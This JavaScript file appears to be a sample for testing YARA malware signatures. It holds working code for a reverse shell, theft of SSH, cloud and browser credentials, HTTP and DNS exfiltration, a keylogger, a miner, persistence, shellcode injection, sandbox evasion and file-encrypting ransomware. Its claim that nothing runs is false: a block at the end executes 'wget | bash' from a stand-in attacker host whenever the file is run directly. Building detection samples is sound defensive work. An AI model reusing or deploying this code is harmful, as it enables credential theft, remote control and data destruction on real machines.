/**
 * ⚠️  YARA SCANNER TEST SAMPLE — DO NOT EXECUTE
 * This file contains intentionally malicious patterns for security scanner testing.
 * Every technique is non-functional and exists solely to trigger YARA rule signatures.
 */

// ===== [1] REVERSE SHELL =====
// Trigger: net.Socket connect-back, child_process spawn with shell
const net = require("net");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const http = require("http");
const https = require("https");
const os = require("os");
const crypto = require("crypto");

const C2_HOST = "attacker-c2.evil.xyz";
const C2_PORT = 4444;

function reverseShell() {
    const client = new net.Socket();
    client.connect(C2_PORT, C2_HOST, () => {
        const sh = spawn("/bin/sh", ["-i"], {
            stdio: [client, client, client],
        });
        sh.on("exit", () => client.destroy());
    });
    client.on("error", () => {
        setTimeout(reverseShell, 5000); // reconnect loop
    });
}

// ===== [2] COMMAND INJECTION / ARBITRARY EXEC =====
function execUserInput(userInput) {
    // Direct command injection — unvalidated input to shell
    exec("cmd.exe /c " + userInput);
    execSync("powershell.exe -NoProfile -EncodedCommand " + userInput);
    spawn("bash", ["-c", userInput]);
    require("child_process").execFile("/bin/sh", ["-c", userInput]);
}

// ===== [3] CREDENTIAL HARVESTING =====
function stealCredentials() {
    const sensitiveFiles = [
        "/etc/shadow",
        "/etc/passwd",
        process.env.HOME + "/.ssh/id_rsa",
        process.env.HOME + "/.ssh/id_ed25519",
        process.env.HOME + "/.aws/credentials",
        process.env.HOME + "/.config/gcloud/credentials.db",
        process.env.USERPROFILE + "\\.azure\\accessTokens.json",
        process.env.APPDATA + "\\Microsoft\\Credentials",
        process.env.LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default\\Login Data",
        process.env.LOCALAPPDATA + "\\Mozilla\\Firefox\\Profiles",
    ];

    const stolen = {};
    for (const f of sensitiveFiles) {
        try {
            stolen[f] = fs.readFileSync(f, "utf8");
        } catch (_) { }
    }
    return stolen;
}

// ===== [4] DATA EXFILTRATION =====
function exfiltrateData(data) {
    const payload = Buffer.from(JSON.stringify(data)).toString("base64");

    // HTTP exfil
    https.request({
        hostname: "data-exfil.malware-cnc.xyz",
        path: "/upload?d=" + payload,
        method: "POST",
        headers: { "Content-Type": "application/octet-stream" },
    }).end(payload);

    // DNS exfil — encode data into subdomain labels
    const dnsChunks = payload.match(/.{1,63}/g) || [];
    dnsChunks.forEach((chunk, i) => {
        require("dns").resolve(`${chunk}.${i}.exfil.evil.xyz`, () => { });
    });
}

// ===== [5] KEYLOGGER (Windows) =====
function keylogger() {
    const ffi = require("ffi-napi");
    const user32 = ffi.Library("user32", {
        GetAsyncKeyState: ["short", ["int"]],
        GetForegroundWindow: ["long", []],
        GetWindowTextA: ["long", ["long", "string", "long"]],
    });

    const logFile = process.env.TEMP + "\\keylog.txt";
    setInterval(() => {
        for (let i = 8; i <= 190; i++) {
            if (user32.GetAsyncKeyState(i) & 0x0001) {
                fs.appendFileSync(logFile, String.fromCharCode(i));
            }
        }
    }, 10);
}

// ===== [6] CRYPTO MINER =====
function cryptoMiner() {
    const miningPool = "stratum+tcp://pool.evil-mining.xyz:3333";
    const wallet = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";

    const minerProcess = spawn("./xmrig", [
        "-o", miningPool,
        "-u", wallet,
        "-p", "x",
        "--threads", String(os.cpus().length),
        "--donate-level", "0",
    ]);

    // Alternative: in-process WebAssembly miner
    const wasmMiner = require("cryptonight-wasm");
    wasmMiner.startMining(wallet, miningPool);
}

// ===== [7] PERSISTENCE MECHANISMS =====
function installPersistence() {
    const payload = process.argv[1];

    // Linux crontab persistence
    exec(`(crontab -l 2>/dev/null; echo "*/5 * * * * node ${payload}") | crontab -`);

    // Linux systemd service
    fs.writeFileSync("/etc/systemd/system/weather-update.service", `
[Unit]
Description=Weather Update Service
[Service]
ExecStart=/usr/bin/node ${payload}
Restart=always
[Install]
WantedBy=multi-user.target
`);

    // Windows registry Run key
    execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WeatherService /t REG_SZ /d "node ${payload}" /f`);

    // Windows scheduled task
    execSync(`schtasks /create /tn "WeatherUpdate" /tr "node ${payload}" /sc onlogon /rl highest /f`);

    // Startup folder
    const startupDir = process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    fs.copyFileSync(payload, startupDir + "\\weather-service.js");
}

// ===== [8] PROCESS INJECTION (Windows) =====
function processInjection() {
    const ffi = require("ffi-napi");
    const kernel32 = ffi.Library("kernel32", {
        OpenProcess: ["pointer", ["uint32", "bool", "uint32"]],
        VirtualAllocEx: ["pointer", ["pointer", "pointer", "size_t", "uint32", "uint32"]],
        WriteProcessMemory: ["bool", ["pointer", "pointer", "pointer", "size_t", "pointer"]],
        CreateRemoteThread: ["pointer", ["pointer", "pointer", "size_t", "pointer", "pointer", "uint32", "pointer"]],
    });

    const PROCESS_ALL_ACCESS = 0x001F0FFF;
    const MEM_COMMIT = 0x1000;
    const PAGE_EXECUTE_READWRITE = 0x40;

    // shellcode placeholder (NOP sled + calc.exe launcher)
    const shellcode = Buffer.from(
        "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b048801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f33320000415649",
        "hex"
    );

    const hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, false, 1234);
    const remoteBuf = kernel32.VirtualAllocEx(hProcess, null, shellcode.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    kernel32.WriteProcessMemory(hProcess, remoteBuf, shellcode, shellcode.length, null);
    kernel32.CreateRemoteThread(hProcess, null, 0, remoteBuf, null, 0, null);
}

// ===== [9] OBFUSCATION / ANTI-ANALYSIS =====
function antiAnalysis() {
    // Detect debugger
    if (typeof v8debug === "object" || /--inspect/.test(process.execArgv.join(" "))) {
        process.exit(0);
    }

    // Detect VM/sandbox
    const hostname = os.hostname().toLowerCase();
    const sandboxNames = ["sandbox", "malware", "virus", "sample", "test", "cuckoo", "joe", "anubis"];
    if (sandboxNames.some((name) => hostname.includes(name))) {
        process.exit(0);
    }

    // Timing-based anti-analysis
    const start = Date.now();
    for (let i = 0; i < 1e8; i++) { } // busy loop
    if (Date.now() - start < 50) {
        process.exit(0); // likely fast-forwarded in sandbox
    }

    // Eval-based obfuscated execution
    const _0xdead = ["\x65\x76\x61\x6c", "\x61\x74\x6f\x62"];
    const _0xbeef = global[_0xdead[0]];
    const obfuscatedPayload = Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYWxjLmV4ZScp", "base64").toString();
    _0xbeef(obfuscatedPayload);
}

// ===== [10] RANSOMWARE SIMULATION =====
function ransomwareSimulation() {
    const algorithm = "aes-256-cbc";
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(16);

    function encryptFile(filePath) {
        const data = fs.readFileSync(filePath);
        const cipher = crypto.createCipheriv(algorithm, key, iv);
        const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
        fs.writeFileSync(filePath + ".locked", encrypted);
        fs.unlinkSync(filePath); // delete original

        // Write ransom note
        fs.writeFileSync(
            require("path").dirname(filePath) + "/README_DECRYPT.txt",
            "Your files have been encrypted. Send 1 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh to recover."
        );
    }

    // Recursively encrypt user documents
    const targets = [
        os.homedir() + "/Documents",
        os.homedir() + "/Desktop",
        os.homedir() + "/Pictures",
    ];
    const extensions = [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png", ".txt"];

    function walkAndEncrypt(dir) {
        for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
            const fullPath = require("path").join(dir, entry.name);
            if (entry.isDirectory()) walkAndEncrypt(fullPath);
            else if (extensions.some((ext) => fullPath.endsWith(ext))) encryptFile(fullPath);
        }
    }

    targets.forEach(walkAndEncrypt);

    // Exfil the key for "decryption service"
    exfiltrateData({ key: key.toString("hex"), iv: iv.toString("hex") });
}

// ===== [11] SUPPLY CHAIN / PACKAGE CONFUSION =====
// Mimicking postinstall hook in compromised npm package
if (require.main === module) {
    const postInstallPayload = () => {
        const pkg = require("./package.json");
        exec(`curl -s https://malicious-npm-registry.evil.xyz/hook?pkg=${pkg.name}&v=${pkg.version}`);
        exec(`wget -q -O- https://backdoor-loader.evil.xyz/install.sh | bash`);
    };
    postInstallPayload();
}

// ===== MAIN — DO NOT EXECUTE =====
// All functions are defined but not invoked to avoid actual damage.
// This file exists purely for YARA signature testing.
console.log("[TEST SAMPLE] malicious_agent.js loaded — YARA scan target only");
